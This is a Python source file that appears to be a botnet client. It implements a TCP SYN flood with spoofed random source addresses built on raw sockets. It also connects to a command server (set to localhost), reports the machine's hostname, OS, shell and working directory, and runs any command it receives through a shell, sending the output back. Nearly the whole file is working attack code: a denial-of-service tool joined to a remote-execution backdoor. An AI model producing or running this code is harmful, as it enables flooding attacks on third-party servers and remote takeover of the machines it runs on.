#!/usr/bin/python3

import socket
import sys
import platform
import os
from threading import Thread
from subprocess import run, PIPE
from time import sleep

import random
import struct

######################## TCP SYN flood ########################

def calculate_checksum(message: bytes) -> int:
    # Split the message into 16-bit words
    words = [message[i:i+2] for i in range(0, len(message), 2)]

    # Convert each word to an integer (network byte order is big endian)
    words = [int.from_bytes(word, 'big') for word in words]

    # Calculate the sum of all words
    sum_words = sum(words)

    # Add any carry bits to the sum
    while sum_words >> 16:
        sum_words = (sum_words & 0xFFFF) + (sum_words >> 16)

    # Take the one's complement of the sum
    checksum = ~sum_words & 0xFFFF

    return checksum

class SynFlood:
    def __init__(self, target_ip : str, target_port : int):
        self.target_ip = target_ip
        self.target_port = target_port

    # Generates an IP address in the format "x.x.x.x" with x a random number between 0 and 255
    def _random_ip(self) -> str:
        while True:
            ip = ".".join([str(random.randint(0, 255)) for _ in range(4)])
            if not ip.startswith('127.'):
                return ip
    
    def _TCP_SYN(self, src_ip : str):
        # Creating the IP header first
        version = 4                                 # 4 bits
        IHL = 5                                     # 4 bits
        vers_ihl = (version << 4) + IHL             # 1 octet
        service = 0                                 # 1 octet
        total_len = 20 + 20                         # 2 octets (IP header length + TCP header length)
        id = random.randint(1,65535)                # 2 octets
        flags_offset = 0                            # 2 octets
        ttl = random.randint(10, 255)               # 1 octet
        proto = socket.IPPROTO_TCP                  # 1 octet
        checksum = 0                                # 2 octets
        src_addr = socket.inet_aton(src_ip)         # 4 octets
        dst_addr = socket.inet_aton(self.target_ip) # 4 octets

        ip_head_no_check = struct.pack('!BBHHHBBH4s4s', vers_ihl, service, total_len, id, flags_offset, ttl, proto, checksum, src_addr, dst_addr)
        checksum = calculate_checksum(ip_head_no_check)

        IP_HEADER = struct.pack('!BBHHHBBH4s4s', vers_ihl, service, total_len, id, flags_offset, ttl, proto, checksum, src_addr, dst_addr)
        #print('IP_HEADER:\n\t', binascii.hexlify(IP_HEADER))

        # Creating the TCP header
        src_port = random.randint(49152, 65535)     # 2 octets
        dst_port = self.target_port                 # 2 octets
        seq_num = 0                                 # 4 octets
        ack_num = 0                                 # 4 octets
        data_offset = 5                             # 4 bits
        reserved = 0                                # 6 bits
        flags = 2                                   # 6 bits (SYN)
        window = 5840                               # 2 octets
        checksum = 0                                # 2 octets
        urgent_pointer = 0                          # 2 octets

        # Concatenate data_offset, reserved and flags to have a 2 octets field
        data_offset_reserved_flags = (data_offset << 12) + (reserved << 6) + flags

        tcp_head_no_check = struct.pack('!HHLLHHHH', src_port, dst_port, seq_num, ack_num, data_offset_reserved_flags, window, checksum, urgent_pointer)

        # Pseudo header for TCP checksum calculation
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(self.target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_head_no_check)

        psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        psh = psh + tcp_head_no_check

        checksum = calculate_checksum(psh)

        TCP_HEADER = struct.pack('!HHLLHHHH', src_port, dst_port, seq_num, ack_num, data_offset_reserved_flags, window, checksum, urgent_pointer)
        #print('TCP_HEADER:\n\t', binascii.hexlify(TCP_HEADER))

        # Creating the packet
        packet = IP_HEADER + TCP_HEADER

        # Printing the packet
        #print('Packet:\n\t', binascii.hexlify(packet))

        # Returning the entire packet
        return packet
    
    def start(self, nb_packets=1000):
        # Socket creation
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            # Set the socket option "IP Header Include" to True
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except socket.error as msg:
            print("Error creating socket: " + str(msg))
            sys.exit(1)

        while True:
            src_ip = self._random_ip()
            packet = self._TCP_SYN(src_ip)
            # Sending the packet
            try:
                s.sendto(packet, (self.target_ip, self.target_port))
            except socket.error as msg:
                print("Error sending packet: " + str(msg))
            
            if nb_packets:
                nb_packets -= 1
                if nb_packets == 0:
                    break
            
######################## Client ########################

BUFFER_SIZE = 4096

def send_msg(conn : socket.socket, msg : str):
    """
    Send a command to a client

    `Required`
    :param conn:    connection to the client
    :param cmd:     command to send to the client
    """
    try:
        conn.sendall(msg.encode('utf-8'))
    except socket.error as err:
        print("Error sending command: " + str(err))
        return 1
    
def recv_msg(conn : socket.socket):
    """
    Receive a message from a client

    `Required`
    :param conn:    connection to the client
    """
    try:
        msg = conn.recv(BUFFER_SIZE).decode('utf-8')
    except socket.error as msg:
        print("Error receiving message: " + str(msg))
        return 1
    else:
        return msg

class Client:
    def __init__(self):
        self.host = "localhost"
        self.port = 12345
        self.socket = None

        # Connect to server
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            sys.exit(1)
        try:
            self.socket.connect((self.host, self.port))
        except socket.error as msg:
            print("Socket connection error: " + str(msg))
            sys.exit(1)
        else:
            print("Connected to server")


    def send_info(self):
        # Send the computer name
        send_msg(self.socket, socket.gethostname())
        
        sleep(0.1)
        os_name = os.name
        platform_version = platform.system() + ' ' + platform.release()
        # Send the OS
        send_msg(self.socket, platform_version)

        sleep(0.1)
        # Send the shell used by the client
        if(os_name == 'nt'):
            send_msg(self.socket, 'cmd.exe')
        elif(os_name == 'posix'):
            send_msg(self.socket, 'bash')

        sleep(0.1)
        # Send the current working directory
        send_msg(self.socket, os.getcwd())


    def start(self):
        while True:
            task = recv_msg(self.socket)

            if task == 'exit':
                self.socket.close()
                sys.exit(0)
            elif task == 'info':
                self.send_info()
            elif task.startswith('synflood'):
                target = task.split(' ')[1]
                try:
                    nb_packets = int(task.split(' ')[2])
                except IndexError:
                    nb_packets = None
                try:
                    target_ip = target.split(':')[0]
                    target_port = int(target.split(':')[1])
                except IndexError:
                    send_msg(self.socket, 'Invalid target')
                synflood = SynFlood(target_ip, target_port)
                if nb_packets:
                    synflood.start(nb_packets)
                else:
                    synflood.start()
                send_msg(self.socket, 'Synflood done.')
            else:
                self.execute_task(task)
            

    def execute_task(self, task):
        # Use Popen to execute the task
        print('Received task: \n' + task)
        proc = run(task, shell=True, text=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        stdout = proc.stdout
        stderr = proc.stderr
        output = proc.stdout + proc.stderr
        print('Task output:')
        if output:
            print(output)
        elif proc.returncode == 0:
            print('No output')
            output = 'Done'

        # Send the output back to the server
        send_msg(self.socket, output)


if __name__ == "__main__":
    client = Client()

    client.start()
